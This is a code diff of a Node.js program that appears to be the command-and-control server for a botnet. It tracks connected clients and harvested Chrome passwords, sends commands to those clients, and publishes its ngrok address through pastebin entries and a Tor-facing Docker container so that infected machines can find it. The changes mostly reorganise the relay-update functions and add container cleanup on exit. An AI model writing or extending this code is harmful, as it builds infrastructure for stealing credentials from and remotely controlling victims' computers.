@@ -4,40 +4,13 @@ require('log-timestamp');
 var readline = require('readline');
 var ngrok = require('ngrok');
 var paste = require("better-pastebin");
-//var sqlite3 = require('sqlite3');
-//var db = new sqlite3.Database("userdata.db");
 var colors = require('colors');
 var exec = require('child_process').exec;
-//var CryptoJS = require('crypto-js');
-
-// var fs = require("fs")
-// var p = require("node-protobuf") // note there is no .Protobuf part anymore
-// // WARNING: next call will throw if desc file is invalid
-// var pb = new p(fs.readFileSync("./buffer.proto")) // obviously you can use async methods, it's for simplicity reasons
-
-
-/*var blessed = require('blessed');
-var contrib = require('blessed-contrib');
-var screen = blessed.screen();
-var grid = new contrib.grid({rows: 12, cols: 12, screen: screen})
-var map = grid.set(-1, -1, 4, 4, contrib.map, {label: 'World Map'})
-var lcd = grid.set(4,4,4,4, contrib.lcd,
-    {
-      label: "LCD Test",
-      segmentWidth: 0.06,
-      segmentInterval: 0.11,
-      strokeWidth: 0.1,
-      elements: 5,
-      display: 3210,
-      elementSpacing: 4,
-      elementPadding: 2
-    })
-screen.render()*/
-
 
 var clients = [];
 var names = [];
 var chromePasswords = [];
+var docker_container_id;
 
 getPublicIP();
 startPromt();
@@ -109,6 +82,8 @@ function startPromt() {
       rl.prompt();
     }).on('close',function(){process.exit(0);});
 }
+
+// Setup ngrok and update ip in relays
 function getPublicIP() {
 
   //Create pastebin object
@@ -139,6 +114,45 @@ function getPublicIP() {
       }
   );
 
+}
+function updateTorIpServer(text) {
+  // Put new ip
+  exec("echo '" + text + "' > ipServer/ip.html", function(error, stdout, stderr) {
+    // Then Build docker
+    exec('docker build -t "tiked/ip" ./ipServer', function(error, stdout, stderr) {
+      // Then run it
+      exec('docker run -d tiked/ip', function(error, stdout, stderr) {
+        console.log("Container: " + stdout.toString());
+        docker_container_id = stdout.toString();
+      });
+    });
+  });
+}
+function updatePastebin(text) {
+    paste.edit("BuG97BSk", text, function (success, data) {
+      if (success) {
+        if (text != data) {
+            console.log('failed to update pastebin!!!'.bgBlue.red);
+            console.log(text +" != "+ data);
+            updatePastebin(text);
+        }
+        console.log("Updated pastebin ".cyan + "(client)".red);
+          console.log("Client pastebin now: ".cyan + data.cyan);
+      }
+    });
+}
+function updatePastebinBoss(text) {
+    paste.edit("LWK9KdSW", text, function (success, data) {
+      if (success) {
+        if (text != data) {
+            console.log('failed to update pastebin!!!'.bgBlue.red);
+            console.log(text +" != "+ data);
+            updatePastebinBoss(text);
+        }
+          console.log("Updated pastebin ".cyan+ "(boos)".red);
+          console.log("Boss pastebin now: ".cyan + data.cyan);
+      }
+    });
 }
 
 function sendCommand(command) {
@@ -180,44 +194,15 @@ function savePassToSQLite(url, username, password) {
 }*/
 
 
-function updateTorIpServer(text) {
-  var cmd = 'ls';
 
-  // Put new ip
-  exec("echo '" + text + "' > ipServer/ip.html", function(error, stdout, stderr) {
-    // Then Build docker
-    exec('docker build -t "tiked/ip" ./ipServer', function(error, stdout, stderr) {
-      // Then run it
-      exec('docker run -d tiked/ip', function(error, stdout, stderr) {});
 
-    });
 
+// Handle exit
+process.on('exit', myExit);
+process.on('SIGINT', myExit);
+function myExit() {
+  console.log("Caught interrupt signal, Stoping...".red);
+  exec('docker stop ' + docker_container_id, function(error, stdout, stderr) {
+    process.exit();
   });
-}
-
-function updatePastebin(text) {
-    paste.edit("BuG97BSk", text, function (success, data) {
-      if (success) {
-        if (text != data) {
-            console.log('failed to update pastebin!!!'.bgBlue.red);
-            console.log(text +" != "+ data);
-            updatePastebin(text);
-        }
-        console.log("Updated pastebin ".cyan + "(client)".red);
-          console.log("Client pastebin now: ".cyan + data.cyan);
-      }
-    });
-}
-function updatePastebinBoss(text) {
-    paste.edit("LWK9KdSW", text, function (success, data) {
-      if (success) {
-        if (text != data) {
-            console.log('failed to update pastebin!!!'.bgBlue.red);
-            console.log(text +" != "+ data);
-            updatePastebinBoss(text);
-        }
-          console.log("Updated pastebin ".cyan+ "(boos)".red);
-          console.log("Boss pastebin now: ".cyan + data.cyan);
-      }
-    });
 }
